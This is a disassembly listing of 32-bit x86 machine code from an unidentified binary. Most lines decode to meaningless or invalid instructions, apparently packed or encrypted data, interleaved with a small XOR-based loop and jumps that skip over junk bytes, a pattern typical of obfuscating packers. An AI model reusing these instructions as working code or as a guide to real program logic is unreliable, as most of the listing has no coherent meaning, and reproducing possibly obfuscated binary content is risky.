  403a7b:	or     DWORD PTR [ecx-0x27],0x2c
  403a7f:	pop    ds
  403a80:	mov    bl,0x9b
  403a82:	stos   BYTE PTR es:[edi],al
  403a83:	cld    
  403a84:	jmp    0xc091:0x815aff40
  403a8b:	(bad)  
  403a8d:	mov    DWORD PTR [esi-0x21f8d08e],esi
  403a93:	jmp    0x403a50
  403a95:	test   ch,0x65
  403a98:	je     0x403adb
  403a9a:	out    dx,eax
  403a9b:	(bad)  
  403a9c:	fs inc esi
  403a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9f:	jecxz  0x403aa6
  403aa1:	push   ss
  403aa2:	ins    BYTE PTR es:[edi],dx
  403aa3:	adc    bl,BYTE PTR ds:0x377bd50
  403aa9:	outs   dx,DWORD PTR ds:[esi]
  403aaa:	xor    edx,edx
  403aac:	push   ebp
  403aad:	lahf   
  403aae:	out    0xcd,eax
  403ab0:	mov    bh,0xf4
  403ab2:	ja     0x403afa
  403ab4:	inc    esi
  403ab5:	and    BYTE PTR [eax-0x69],ch
  403ab8:	dec    edi
  403ab9:	sbb    DWORD PTR [ebp-0x28e80996],ebp
  403abf:	and    al,0xe3
  403ac1:	imul   DWORD PTR [edi]
  403ac3:	sbb    ebp,esp
  403ac5:	xor    eax,0x56437293
  403aca:	cwde   
  403acb:	xchg   ecx,eax
  403acc:	ss inc dh
  403acf:	scas   eax,DWORD PTR es:[edi]
  403ad0:	mov    ds:0x30932713,al
  403ad5:	jno    0x403a90
  403ad7:	call   0x954acfbc
  403adc:	iret   
  403add:	mov    eax,0x32b212e0
  403ae2:	adc    BYTE PTR [eax-0x5746a450],ah
  403ae8:	daa    
  403ae9:	inc    edi
  403aea:	dec    ebp
  403aeb:	xchg   BYTE PTR [esi],ah
  403aed:	push   0xffffffa6
  403aef:	sub    cl,BYTE PTR [ecx+edx*2+0x7f]
  403af3:	xchg   edi,eax
  403af4:	test   al,0x8e
  403af6:	retf   0x3207
  403af9:	in     eax,dx
  403afa:	mov    al,ds:0xc3fe629f
  403aff:	xor    al,0x1a
  403b01:	mov    ah,0x13
  403b03:	sbb    BYTE PTR [ebx],0xf6
  403b06:	inc    esi
  403b07:	es loopne 0x403b5e
  403b0a:	pop    ecx
  403b0b:	inc    esi
  403b0c:	mov    al,0x41
  403b0e:	pop    ss
  403b0f:	inc    ebx
  403b10:	pop    eax
  403b11:	aaa    
  403b12:	dec    edi
  403b13:	pop    ecx
  403b14:	into   
  403b15:	and    ebx,ebp
  403b17:	shr    DWORD PTR [esi],0xee
  403b1a:	(bad)  
  403b1b:	imul   DWORD PTR [ebp+0x2389c26]
  403b21:	adc    al,0x17
  403b23:	nop
  403b24:	dec    edi
  403b25:	aaa    
  403b26:	aaa    
  403b27:	mov    DWORD PTR [esi],eax
  403b29:	stc    
  403b2a:	cwde   
  403b2b:	xchg   ecx,eax
  403b2c:	xchg   BYTE PTR [eax-0x4f33eb08],ch
  403b32:	lea    ebp,[esi+0x4f49b2e5]
  403b38:	imul   ecx,edi,0xffffffe3
  403b3b:	dec    ecx
  403b3c:	fstp   TBYTE PTR [esi-0xc]
  403b3f:	stos   BYTE PTR es:[edi],al
  403b40:	cwde   
  403b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b42:	push   es
  403b43:	and    dh,ch
  403b45:	in     al,0x0
  403b47:	inc    esi
  403b48:	(bad)  
  403b49:	mov    ebp,0xfdd1b053
  403b4e:	les    esi,FWORD PTR [edi]
  403b50:	adc    eax,0x9c8aa368
  403b55:	jae    0x403b82
  403b57:	or     bh,cl
  403b59:	imul   ebx,DWORD PTR [ebp-0x4],0x67
  403b5d:	sub    DWORD PTR [edx],ebx
  403b5f:	or     esi,DWORD PTR [eax-0x4c]
  403b62:	and    esi,DWORD PTR [ebp-0x47]
  403b65:	imul   edx,DWORD PTR [edi],0xd0d8fb15
  403b6b:	mov    dh,0xde
  403b6d:	dec    esp
  403b6e:	xor    cl,BYTE PTR [eax-0x59fdd894]
  403b74:	add    ebx,edx
  403b76:	out    0x4f,al
  403b78:	mov    al,0x53
  403b7a:	call   0x6f552325
  403b7f:	loop   0x403b62
  403b81:	inc    ecx
  403b82:	inc    edx
  403b83:	pop    ebx
  403b84:	xor    ebx,DWORD PTR [esi]
  403b86:	out    dx,eax
  403b87:	(bad)  
  403b88:	mov    edi,0xa23c04df
  403b8d:	add    BYTE PTR [ebx+0x53],ch
  403b90:	icebp  
  403b91:	cwde   
  403b92:	push   edx
  403b93:	xor    eax,0x108d692d
  403b98:	mov    al,ds:0x98ea1829
  403b9d:	pop    eax
  403b9e:	out    dx,al
  403b9f:	pop    es
  403ba0:	scas   eax,DWORD PTR es:[edi]
  403ba1:	jmp    0x94eef8d1
  403ba6:	std    
  403ba7:	xor    DWORD PTR [esi-0x2b],esi
  403baa:	ror    DWORD PTR [ebx+ecx*1-0x40],1
  403bae:	xor    al,0xb9
  403bb0:	les    ebp,FWORD PTR [esi+0x5e23237d]
  403bb6:	jg     0x403be4
  403bb8:	pop    es
  403bb9:	push   es
  403bba:	js     0x403b98
  403bbc:	loope  0x403c1f
  403bbe:	clc    
  403bbf:	ins    BYTE PTR es:[edi],dx
  403bc0:	sti    
  403bc1:	mov    ch,BYTE PTR [edi+0x63]
  403bc4:	(bad)  
  403bc5:	mov    cl,0x3d
  403bc7:	mov    al,ds:0xa51859f9
  403bcc:	xchg   ecx,eax
  403bcd:	inc    eax
  403bce:	loope  0x403b96
  403bd0:	mov    ebx,0xe29e439
  403bd5:	in     al,dx
  403bd6:	or     ebx,DWORD PTR [eax]
  403bd8:	jne    0x403b6e
  403bda:	loope  0x403bf8
  403bdc:	and    al,0xaf
  403bde:	push   edi
  403bdf:	xchg   esi,eax
  403be0:	xchg   eax,edi
  403be2:	(bad)  
  403be3:	xlat   BYTE PTR ds:[ebx]
  403be4:	clc    
  403be5:	push   edi
  403be6:	or     BYTE PTR [esi-0x53],0xfa
  403bea:	into   
  403beb:	or     al,0xe3
  403bed:	xor    BYTE PTR [edi],ah
  403bef:	inc    ecx
  403bf0:	jecxz  0x403c35
  403bf2:	pop    ebp
  403bf3:	xor    ch,cl
  403bf5:	pop    ss
  403bf6:	aam    0x4
  403bf8:	jb     0x403c45
  403bfa:	jmp    0xd1d40670
  403bff:	(bad)  
  403c00:	mov    ah,0xcb
  403c02:	cmp    ch,BYTE PTR [ebx]
  403c04:	test   al,0x61
  403c06:	mov    ecx,0xff60f96
  403c0b:	test   BYTE PTR [edi-0x38fffffb],dl
  403c11:	inc    ebp
  403c12:	call   0x74639a6
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0xe8dcf48b
  403c29:	mov    eax,0x1e42a002
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403bc8
  403c35:	in     al,0x43
  403c37:	sbb    al,0xbc
  403c39:	loope  0x403c10
  403c3b:	inc    edi
  403c3c:	jo     0x403c49
  403c3e:	fcom   DWORD PTR [ecx]
  403c40:	test   DWORD PTR [ebx],ebx
  403c42:	xlat   BYTE PTR ds:[ebx]
  403c43:	and    DWORD PTR [edx-0x1fb70ec7],esi
  403c49:	ins    DWORD PTR es:[edi],dx
  403c4a:	pop    ss
  403c4b:	(bad)  
  403c4c:	shl    edi,cl
  403c4e:	(bad)  
  403c4f:	(bad)  
  403c50:	adc    BYTE PTR [edi-0x42],ch
  403c53:	push   ebx
  403c54:	lods   al,BYTE PTR ds:[esi]
  403c55:	adc    edi,ecx
  403c57:	inc    edx
  403c58:	je     0x403c26
  403c5a:	jecxz  0x403c12
  403c5c:	mov    bl,bh
  403c5e:	std    
  403c5f:	ret    
  403c60:	imul   ecx,DWORD PTR [edi+0x732522a8],0xa2e0df09
  403c6a:	bound  esp,QWORD PTR [ecx+0x316cfaa]
  403c70:	push   0x67a908e6
  403c75:	pop    esp
  403c76:	gs mov dl,0x24
  403c79:	push   cs
  403c7a:	into   
  403c7b:	stos   BYTE PTR es:[edi],al
  403c7c:	pop    ds
  403c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c7e:	cmp    DWORD PTR [edi-0x77],ecx
  403c81:	jge    0x403c46
  403c83:	sbb    BYTE PTR [edx],dh
  403c85:	xchg   ebx,eax
  403c86:	(bad)  
  403c87:	add    al,0x6e
  403c89:	sahf   
  403c8a:	pop    edx
  403c8b:	cmp    esp,DWORD PTR [edi]
  403c8d:	or     al,0x6b
  403c8f:	mov    ds,WORD PTR [ecx]
  403c91:	test   al,0x2d
  403c93:	addr16 ja 0x403d04
  403c96:	jmp    0x403d17
  403c98:	adc    eax,0xc80162
  403c9d:	jl     0x403cba
  403c9f:	pushf  
  403ca0:	in     al,dx
  403ca1:	clc    
  403ca2:	ror    cl,1
  403ca4:	push   eax
  403ca5:	fs jp  0x403d09
  403ca8:	sbb    DWORD PTR [esi],0xaef4798d
  403cae:	mov    edx,edx
  403cb0:	xor    eax,0xba06093
  403cb5:	popf   
  403cb6:	dec    ecx
  403cb7:	adc    eax,0x724d7cf8
  403cbc:	cmp    ecx,DWORD PTR [esp+esi*4]
  403cbf:	sub    esi,DWORD PTR [esp+0x5ab5bff1]
  403cc6:	push   esi
  403cc7:	mov    edi,0x77ff2e48
  403ccc:	sahf   
  403ccd:	cdq    
  403cce:	cwde   
  403ccf:	mov    ds:0xf0eb0755,eax
  403cd4:	jecxz  0x403d04
  403cd6:	cwde   
  403cd7:	dec    eax
  403cd8:	jmp    FWORD PTR [ecx+0x5a]
  403cdb:	daa    
  403cdc:	mov    ecx,0x4e9d5e10
  403ce1:	popf   
  403ce2:	nop
  403ce3:	mov    ah,0xb0
  403ce5:	xor    DWORD PTR [esi+0x7d136eed],edx
  403ceb:	pop    eax
  403cec:	pop    esp
  403ced:	mov    cl,0x5b
  403cef:	cmp    dl,BYTE PTR [eax]
  403cf1:	push   0xffffffb5
  403cf3:	out    0xec,eax
  403cf5:	push   ss
  403cf6:	mov    gs,edi
  403cf8:	enter  0xfdf9,0x57
  403cfc:	rol    edx,0x0
  403cff:	test   al,0x5c
  403d01:	pop    ebp
  403d02:	xor    al,0x33
  403d04:	popf   
  403d05:	adc    al,0xda
  403d07:	push   ecx
  403d08:	mov    BYTE PTR [ecx-0x3320c40c],ah
  403d0e:	mov    al,0xc3
  403d10:	sbb    al,0x59
  403d12:	std    
  403d13:	mov    al,0x91
  403d15:	push   cs
  403d16:	mov    ds:0x1ec6b0a7,al
  403d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d1d:	in     eax,dx
  403d1e:	fimul  WORD PTR [eax+0x6b2d6d9]
  403d24:	stos   DWORD PTR es:[edi],eax
  403d25:	pop    ebx
  403d26:	add    ch,BYTE PTR [ebx+0x26]
  403d29:	xchg   esp,eax
  403d2a:	daa    
  403d2b:	ins    BYTE PTR es:[edi],dx
  403d2c:	push   ebp
  403d2d:	pop    edi
  403d2e:	repnz pop ds
  403d30:	into   
  403d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d32:	out    0xd8,eax
  403d34:	js     0x403dac
  403d36:	cmp    al,0x4
  403d38:	xor    BYTE PTR [ecx+0x74],0x90
  403d3c:	call   0x577a:0x358879fd
  403d43:	rcr    BYTE PTR [ecx+eiz*2+0x566417b0],1
  403d4a:	loop   0x403cf2
  403d4c:	lods   al,BYTE PTR ds:[esi]
  403d4d:	out    dx,al
  403d4e:	dec    ebx
  403d4f:	jo     0x403d5f
  403d51:	(bad)  
  403d52:	dec    ecx
  403d53:	scas   al,BYTE PTR es:[edi]
  403d54:	arpl   cx,ax
  403d56:	adc    dh,BYTE PTR [edi]
  403d58:	dec    eax
  403d59:	xchg   ebx,eax
  403d5a:	fild   WORD PTR [ecx-0x4]
  403d5d:	cmp    dl,BYTE PTR [edx-0x30]
  403d60:	nop
  403d61:	sbb    al,0x6d
  403d63:	mov    edx,0x5a45dd47
  403d68:	or     ch,dl
  403d6a:	or     BYTE PTR [eax-0x76],bl
  403d6d:	fdiv   st,st(2)
  403d6f:	sub    al,0x27
  403d71:	(bad)  
  403d73:	or     BYTE PTR [esi+0x1c],ch
  403d76:	and    BYTE PTR [esi],ch
  403d78:	iret   
  403d79:	sbb    eax,0x32cebae0
  403d7e:	lock fadd DWORD PTR [esp+ebx*1-0x5d249c40]
  403d86:	sbb    DWORD PTR [edi],0xffffff89
  403d89:	adc    DWORD PTR [edx],esi
  403d8b:	adc    al,0x55
  403d8d:	imul   ebp,DWORD PTR [esi],0x8cbc8ae9
  403d93:	dec    ebp
  403d94:	adc    dl,bh
  403d96:	(bad)  
  403d97:	cmp    eax,0xac6fb889
  403d9c:	fwait
  403d9d:	cmp    BYTE PTR [edx],dl
  403d9f:	mov    ah,0x49
  403da1:	pop    ebx
  403da2:	mov    cl,0x4d
  403da4:	pop    esi
  403da5:	cmc    
  403da6:	adc    al,0xf9
  403da8:	shl    DWORD PTR [ebp+0x62],1
  403dab:	mov    esp,0xe7666924
  403db0:	jecxz  0x403d68
  403db2:	ret    
  403db3:	fs cld 
  403db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403db6:	test   DWORD PTR [esi],esp
  403db8:	inc    edx
  403db9:	popa   
  403dba:	push   es
  403dbb:	xor    dl,BYTE PTR [edi-0x46]
  403dbe:	scas   eax,DWORD PTR es:[edi]
  403dbf:	fwait
  403dc0:	outs   dx,DWORD PTR ds:[esi]
  403dc1:	adc    BYTE PTR [ecx],dl
  403dc3:	scas   eax,DWORD PTR es:[edi]
  403dc4:	arpl   WORD PTR ds:[esi+0x6dedf72a],bp
  403dcb:	jo     0x403e40
  403dcd:	sub    DWORD PTR [esi+0x4460c31b],edx
  403dd3:	sbb    BYTE PTR [edx+0x37],dh
  403dd6:	pop    es
  403dd7:	push   0x17b2e02
  403ddc:	(bad)  
  403ddd:	dec    ebp
  403dde:	dec    edx
  403ddf:	inc    esi
  403de0:	jmp    0xe845:0x8dc318f0
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi-0x138cc627],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403e03
  403e11:	jo     0x403da5
  403e13:	mov    ah,0x7
  403e15:	cmc    
  403e16:	mov    ah,0xf3
  403e18:	and    dl,BYTE PTR [esi]
  403e1a:	cmp    BYTE PTR [ebp-0x61],0x34
  403e1e:	inc    edi
  403e1f:	cmp    bl,bh
  403e21:	ret    
  403e22:	bound  ebx,QWORD PTR [ebx+0x74]
  403e25:	addr16 leave 
  403e27:	imul   eax,DWORD PTR [eax+0x27925090],0x461e32a7
  403e31:	xchg   ebp,eax
  403e32:	mov    esi,DWORD PTR [esi+0x72]
  403e35:	inc    ebx
  403e36:	aas    
  403e37:	inc    eax
  403e38:	mov    dl,0xd0
  403e3a:	jmp    0x403eb0
  403e3c:	adc    eax,0xf4ebf46d
  403e41:	imul   ecx,DWORD PTR [eax-0x1ad8dacf],0x73ae3a3d
  403e4b:	mov    eax,0xde91dfc1
  403e50:	mov    ah,0xb0
  403e52:	test   dl,0x25
  403e55:	call   0xb181:0xe8527364
  403e5c:	hlt    
  403e5d:	jmp    0xf4ecd755
  403e62:	test   DWORD PTR [ebp-0x4a],ebx
  403e65:	pop    edx
  403e66:	sbb    DWORD PTR [eax],0x306cf4a8
  403e6c:	add    al,0x8
  403e6e:	and    bl,BYTE PTR ds:0x42f727b6
  403e74:	adc    al,0xae
  403e76:	mov    esp,0x4988d6f1
  403e7b:	shl    DWORD PTR [ecx],0x46
  403e7e:	mov    ah,0x87
  403e80:	xchg   ebx,eax
  403e81:	inc    edx
  403e82:	(bad)  
  403e83:	jmp    0x572b:0x1d4a3f28
  403e8a:	mov    WORD PTR [edx+edi*1+0x5d],ds
  403e8e:	cs xchg ecx,eax
  403e90:	adc    eax,0xefd69227
  403e95:	dec    edx
  403e96:	ret    0x424d
  403e99:	mov    dh,0x13
  403e9b:	cmp    al,0x68
  403e9d:	mov    ?,eax
  403e9f:	or     al,0xbd
  403ea1:	jmp    0x403f1d
  403ea3:	in     eax,dx
  403ea4:	loop   0x403eb7
  403ea6:	cmp    edi,DWORD PTR [ebx+eiz*4-0x7c022dd3]
  403ead:	retf   
  403eae:	lock (bad) 
  403eb0:	sbb    eax,0x9d730bec
  403eb5:	mov    al,0x6a
  403eb7:	cmp    bh,BYTE PTR ds:0xfe8980df
  403ebd:	mov    al,ds:0x831ad6da
  403ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ec3:	outs   dx,DWORD PTR ds:[esi]
  403ec4:	xchg   ebx,eax
  403ec5:	mov    esp,fs
  403ec7:	push   ds
  403ec8:	loop   0x403ea0
  403eca:	ret    0x8fbc
  403ecd:	push   ebp
  403ece:	jmp    0x4be5a396
  403ed3:	xchg   esp,eax
  403ed4:	popa   
  403ed5:	push   es
  403ed6:	or     BYTE PTR [edx],ah
  403ed8:	xchg   DWORD PTR [esi-0x47],esi
  403edb:	lock jns 0x403ef9
  403ede:	cmc    
  403edf:	mov    ecx,0xfd990ba9
  403ee4:	test   al,0xb
  403ee6:	adc    edi,DWORD PTR [edi+0xe]
  403ee9:	inc    esi
  403eea:	sub    dh,BYTE PTR [esi+0x4d]
  403eed:	add    al,0x7e
  403eef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ef0:	mov    edi,0x49e50eb0
  403ef5:	mov    ?,WORD PTR [ecx]
  403ef7:	mov    ch,0x83
  403ef9:	xchg   esi,eax
  403efa:	pop    ss
  403efb:	into   
  403efc:	sbb    eax,0x4c408de0
  403f01:	inc    ecx
  403f02:	dec    esi
  403f03:	mov    eax,ds:0xb5ac87b1
  403f08:	call   0x22a4:0x5d6b2a0e
  403f0f:	add    edx,DWORD PTR [ebp-0x7aa14f06]
  403f15:	push   ds
  403f16:	pop    ebx
  403f17:	ds jg  0x403f97
  403f1a:	adc    al,0xc7
  403f1c:	sbb    al,0xee
  403f1e:	das    
  403f1f:	lea    eax,[ebx+0x77]
  403f22:	cs sub al,0x9f
  403f25:	sub    edi,DWORD PTR [edx-0x67]
  403f28:	sbb    edi,DWORD PTR ds:0xa9a9454
  403f2e:	out    0x17,al
  403f30:	mov    bh,0xaf
  403f32:	ror    DWORD PTR [ebx-0x3b283f50],0x84
  403f39:	and    DWORD PTR [ebp-0x4f],0xffffffd4
  403f3d:	mov    cl,BYTE PTR ds:0x8a1bff1
  403f43:	adc    eax,0x50efab1a
  403f48:	add    dl,BYTE PTR [ecx-0x5b1f96fe]
  403f4e:	cmp    al,bh
  403f50:	int3   
  403f51:	repz xchg ebx,eax
  403f53:	dec    edi
  403f54:	fsub   QWORD PTR [ecx+0x22]
  403f57:	push   edi
  403f58:	cdq    
  403f59:	mov    BYTE PTR [ebx],cl
  403f5b:	and    eax,0xbbceb0e3
  403f60:	jne    0x403fca
  403f62:	dec    esi
  403f63:	push   ss
  403f64:	jl     0x403f60
  403f66:	pop    eax
  403f67:	push   es
  403f68:	mov    al,0x7e
  403f6a:	test   dl,dh
  403f6c:	pop    ss
  403f6d:	adc    al,0x3c
  403f6f:	(bad)  
  403f70:	or     al,0xfc
  403f72:	jo     0x403ef7
  403f74:	pop    ebp
  403f75:	cmp    cl,BYTE PTR [edx+0x7451e75f]
  403f7b:	scas   al,BYTE PTR es:[edi]
  403f7c:	dec    esp
  403f7d:	imul   esp,DWORD PTR [ebp+0x38],0x260b09fb
  403f84:	ror    dh,1
  403f86:	mov    edi,0x3c467353
  403f8b:	fsubr  st(5),st
  403f8d:	adc    DWORD PTR [ecx-0x470e5cfb],ecx
  403f93:	push   ds
  403f94:	stos   BYTE PTR es:[edi],al
  403f95:	out    0x64,eax
  403f97:	push   ds
  403f98:	ror    cl,1
  403f9a:	mov    dh,0x29
  403f9c:	cwde   
  403f9d:	call   0xbae5c273
  403fa2:	rcl    BYTE PTR [edx+0x46],1
  403fa5:	lods   eax,DWORD PTR ds:[esi]
  403fa6:	or     bl,dl
  403fa8:	stos   DWORD PTR es:[edi],eax
  403fa9:	push   0x1
  403fab:	pop    esp
  403fac:	xlat   BYTE PTR ds:[ebx]
  403fad:	aaa    
  403fae:	xor    al,0x1e
  403fb0:	or     ah,BYTE PTR [edx]
  403fb2:	mov    edx,0xf6426753
  403fb7:	fidiv  DWORD PTR [ecx+0x34]
  403fba:	and    BYTE PTR [eax+0x52910c23],0x8b
  403fc1:	inc    ebp
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	stos   DWORD PTR es:[edi],eax
  403fda:	rol    BYTE PTR [ecx],cl
  403fdc:	push   0x7e7e1a22
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x404048
  403fe6:	xchg   ebp,eax
  403fe7:	cs pop esp
  403fe9:	and    al,0x98
  403feb:	(bad)  
  403fec:	mov    dh,0xba
  403fee:	push   edx
  403fef:	stc    
  403ff0:	addr16 xor eax,0xbb66a558
  403ff7:	repz pop ss
  403ff9:	mov    al,ds:0x3dec6d17
  403ffe:	(bad)  
  403fff:	jmp    0xfcc516c0
  404004:	popf   
  404005:	and    DWORD PTR [edi+0x57],ebp
  404008:	mov    ds:0x5fe1c09c,al
  40400d:	fldenv [edi-0xbe8d9cf]
  404013:	sti    
  404014:	test   eax,0x72d865bb
  404019:	add    BYTE PTR [ebx],dl
  40401b:	ins    BYTE PTR es:[edi],dx
  40401c:	out    dx,eax
  40401d:	or     BYTE PTR [ebx-0x70af8c58],0x87
  404024:	ret    
  404025:	push   ss
  404026:	mov    al,ds:0xec3067f6
  40402b:	mov    ebx,0xb911e368
  404030:	mov    ecx,0x883cc3d1
  404035:	mov    dl,0xb2
  404037:	cmp    eax,0x82d694df
  40403c:	test   DWORD PTR [eax-0x79],esi
  40403f:	inc    edi
  404040:	fwait
  404041:	cdq    
  404042:	sub    al,BYTE PTR [ecx-0x16]
  404045:	mov    ds:0x68b42f20,al
  40404a:	imul   ecx,ecx,0xffffffd7
  40404d:	cs fst st(0)
  404050:	jge    0x4040c3
  404052:	outs   dx,DWORD PTR ds:[esi]
  404053:	in     eax,0x28
  404055:	or     bh,BYTE PTR [ecx-0x65]
  404058:	jmp    0xa9f1:0x478bd31a
  40405f:	mov    eax,ds:0xab148046
  404064:	mov    bl,0x41
  404066:	inc    eax
  404067:	mul    BYTE PTR [eax]
  404069:	add    DWORD PTR [ecx+0x65],ecx
  40406c:	inc    ebp
  40406d:	fdiv   st(0),st
  40406f:	adc    DWORD PTR [eax+0x2a],eax
  404072:	cld    
  404073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404074:	pop    eax
  404075:	imul   edx,DWORD PTR [esi+ebp*1+0x3],0xffffffee
  40407a:	sbb    eax,0xd7ebe955
  40407f:	push   ds
  404080:	inc    esi
  404081:	adc    esp,DWORD PTR [ebx+edi*4+0x1a0e9aa6]
  404088:	jl     0x404035
  40408a:	sub    cl,BYTE PTR [ecx+0x26]
  40408d:	lods   eax,DWORD PTR ds:[esi]
  40408e:	loop   0x40401c
  404090:	fst    st(1)
  404092:	mov    ecx,0x682bfbba
  404097:	sub    dh,ah
  404099:	adc    bh,ah
  40409b:	sahf   
  40409c:	mov    eax,ds:0x81215596
  4040a1:	push   ebx
  4040a2:	pop    ebx
  4040a3:	jg     0x404097
  4040a5:	mov    edi,0x3dd109c2
  4040aa:	mov    edx,0x3e37978c
  4040af:	mov    ebp,0x5e379afd
  4040b4:	ret    0x4d3f
  4040b7:	data16 mov al,ds:0x8aa72cb6
  4040bd:	cld    
  4040be:	sub    eax,0x9c1c31e3
  4040c3:	push   0x5a
  4040c5:	into   
  4040c6:	call   0xb9ed4c9c
  4040cb:	mov    ds:0xb6c884b9,eax
  4040d0:	cli    
  4040d1:	pop    esp
  4040d2:	jl     0x4040a0
  4040d4:	mov    gs,WORD PTR [ebx-0x215ef9bf]
  4040da:	cmp    al,ah
  4040dc:	scas   eax,DWORD PTR es:[edi]
  4040dd:	mul    DWORD PTR [edi+0x1b849425]
  4040e3:	(bad)  
  4040e4:	div    ebx
  4040e6:	daa    
  4040e7:	adc    al,BYTE PTR [esi]
  4040e9:	push   esp
  4040ea:	inc    ebx
  4040eb:	jl     0x404077
  4040ed:	adc    BYTE PTR es:[ebp-0x3d],bh
  4040f1:	mov    ds:0xc0440a2a,al
  4040f6:	mov    edx,0xafbea11a
  4040fb:	mov    eax,0x52e2c8ec
  404100:	jmp    0xeb49:0xc9aaa415
  404107:	sbb    eax,0x45cd80
  40410c:	push   0x646f0cfe
  404111:	outs   dx,BYTE PTR ds:[esi]
  404112:	jp     0x4040b2
  404114:	push   edi
  404115:	pusha  
  404116:	cmp    eax,0xa0ffe227
  40411b:	shr    DWORD PTR [eax],1
  40411d:	or     eax,0xf53fd64a
  404122:	mov    esp,0xfe54d4db
  404127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404128:	xor    DWORD PTR [edx+0x503e4068],edi
  40412e:	xchg   esi,eax
  40412f:	push   0xfffffffc
  404131:	mov    ch,0x6b
  404133:	out    0x20,al
  404135:	xchg   edx,eax
  404136:	or     ebx,DWORD PTR [ebp+ebx*1+0x45]
  40413a:	call   0xea871d41
  40413f:	fcomp  QWORD PTR [ebx-0x356194b6]
  404145:	ins    DWORD PTR es:[edi],dx
  404146:	je     0x4040f5
  404148:	in     al,0x11
  40414a:	add    BYTE PTR [ebx+0x1ac66750],0xc3
  404151:	les    edi,FWORD PTR [eax-0x68c6eae]
  404157:	mov    ebp,0xbcd9245
  40415c:	xchg   ebp,eax
  40415d:	rcl    DWORD PTR [ebx-0x32],cl
  404160:	or     al,0x6f
  404162:	stos   BYTE PTR es:[edi],al
  404163:	add    eax,DWORD PTR [ecx+0x2237d41e]
  404169:	xchg   eax,esi
  40416b:	mov    bh,0xf6
  40416d:	jmp    0x5b902eaa
  404172:	and    al,0xbc
  404174:	pop    edi
  404175:	daa    
  404176:	xchg   edi,eax
  404177:	mov    bl,0x53
  404179:	or     al,0x44
  40417b:	push   ds
  40417c:	punpckldq mm7,DWORD PTR [ecx+esi*2+0x62f71c85]
  404184:	sub    al,BYTE PTR [eax]
  404186:	sub    eax,0x8c59ffe1
  40418b:	imul   edx,DWORD PTR [ebp+0x7c],0x8
  40418f:	sub    al,0xeb
  404191:	xor    edi,edi
  404193:	hlt    
  404194:	stc    
  404195:	lea    eax,[eax+edx*1+0x32729b]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	cdq    
  4041d6:	fimul  WORD PTR [esi]
  4041d8:	pop    ecx
  4041d9:	push   edx
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x404227
  4041e2:	or     eax,0x412adb30
  4041e7:	fwait
  4041e8:	mov    cl,0x9e
  4041ea:	lea    ecx,[ebx-0x1f]
  4041ed:	out    0x4c,eax
  4041ef:	inc    eax
  4041f0:	ficom  DWORD PTR [esi-0x6bb74c26]
  4041f6:	and    BYTE PTR [ebp+0x4c94e9f6],al
  4041fc:	pusha  
  4041fd:	push   edi
  4041fe:	fcmovb st,st(6)
  404200:	xor    esi,DWORD PTR [ebp-0x22749971]
  404206:	(bad)  
  404207:	rol    DWORD PTR ds:0x5324377c,1
  40420d:	sbb    eax,0xbba63b6e
  404212:	xchg   edi,eax
  404213:	int3   
  404214:	jl     0x4041db
  404216:	mov    ebp,0x7deb2f2f
  40421b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40421c:	stc    
  40421d:	mov    ecx,0xa40b7395
  404222:	sbb    BYTE PTR [eax-0x165ad6ea],al
  404228:	or     dh,BYTE PTR [edi-0x10]
  40422b:	cmp    esp,DWORD PTR [edx+0x4c]
  40422e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40422f:	inc    ecx
  404230:	ins    DWORD PTR es:[edi],dx
  404231:	and    eax,0x9b50f3f9
  404236:	dec    eax
  404237:	popa   
  404238:	repz or BYTE PTR [esi],bl
